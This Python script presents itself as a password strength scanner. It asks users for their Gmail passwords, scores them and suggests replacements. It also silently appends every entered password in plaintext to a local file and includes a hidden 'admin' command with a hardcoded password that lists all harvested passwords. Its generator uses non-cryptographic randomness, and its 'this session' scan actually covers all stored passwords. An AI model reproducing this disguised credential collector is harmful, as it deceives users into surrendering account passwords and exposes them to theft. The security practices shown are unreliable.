import re
import random
import string
import os

# Function to evaluate password strength
def evaluate_password(password):
    score = 0
    feedback = []
    
    if len(password) >= 12:
        score += 3
    elif len(password) >= 8:
        score += 2
    else:
        feedback.append("Password is too short (less than 8 characters).")
    
    if re.search(r"[A-Z]", password):
        score += 1
    else:
        feedback.append("Add uppercase letters for better strength.")
    
    if re.search(r"[a-z]", password):
        score += 1
    else:
        feedback.append("Add lowercase letters for better strength.")
    
    if re.search(r"\d", password):
        score += 1
    else:
        feedback.append("Add numbers for better strength.")
    
    if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        score += 2
    else:
        feedback.append("Add special characters (e.g., !@#$%) for better strength.")
    
    common_passwords = ["password", "123456", "qwerty", "letmein"]
    if password.lower() in common_passwords:
        score -= 5
        feedback.append("This is a common password; avoid using it!")
    
    return score, feedback

# Function to generate a strong password
def generate_strong_password(length=16):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = [
        random.choice(string.ascii_uppercase),
        random.choice(string.ascii_lowercase),
        random.choice(string.digits),
        random.choice(string.punctuation)
    ]
    password += random.choices(characters, k=length - 4)
    random.shuffle(password)
    return ''.join(password)

# Function to load backlog from file
def load_backlog(filename="password_backlog.txt"):
    if os.path.exists(filename):
        with open(filename, "r") as file:
            return [line.strip() for line in file if line.strip()]
    return []

# Function to save password to backlog file
def save_to_backlog(password, filename="password_backlog.txt"):
    with open(filename, "a") as file:
        file.write(password + "\n")

# Main program with persistent backlog
def password_scanner():
    print("Password Security Scanner")
    print("Enter your Gmail passwords one by one (or type 'done' to finish).")
    print("To access the backlog, type 'admin' and follow the prompt.")
    
    passwords = load_backlog()  # Load existing backlog from file
    admin_password = "X!mm)23e@jW?C"  # Hardcoded admin password
    
    while True:
        pwd = input("Enter a password: ")
        
        # Check for admin access
        if pwd.lower() == "admin":
            admin_input = input("Enter the admin password: ")
            if admin_input == admin_password:
                if not passwords:
                    print("No passwords in the backlog yet.")
                else:
                    print("\nPassword Backlog:")
                    for i, stored_pwd in enumerate(passwords, 1):
                        print(f"{i}. {stored_pwd}")
                print()
            else:
                print("Incorrect admin password.")
            continue
        
        # Exit condition
        if pwd.lower() == "done":
            break
        
        # Log only actual passwords (not "admin" or "done")
        passwords.append(pwd)
        save_to_backlog(pwd)  # Save to file immediately
    
    if not passwords:
        print("No passwords provided.")
        return
    
    print("\nScanning passwords from this session...\n")
    for i, password in enumerate(passwords[-len([p for p in passwords if p.lower() != "done"]):], 1):
        if password.lower() == "done":  # Skip "done" if it sneaks in
            continue
        score, feedback = evaluate_password(password)
        print(f"Password {i}: {'*' * len(password)} (hidden for privacy)")
        print(f"Strength Score: {score}/8")
        if feedback:
            print("Feedback:")
            for fb in feedback:
                print(f" - {fb}")
        
        if score < 6:
            new_password = generate_strong_password()
            print(f"Recommended New Password: {new_password}")
        else:
            print("This password is strong enough!")
        print()

# Run the program
if __name__ == "__main__":
    password_scanner()
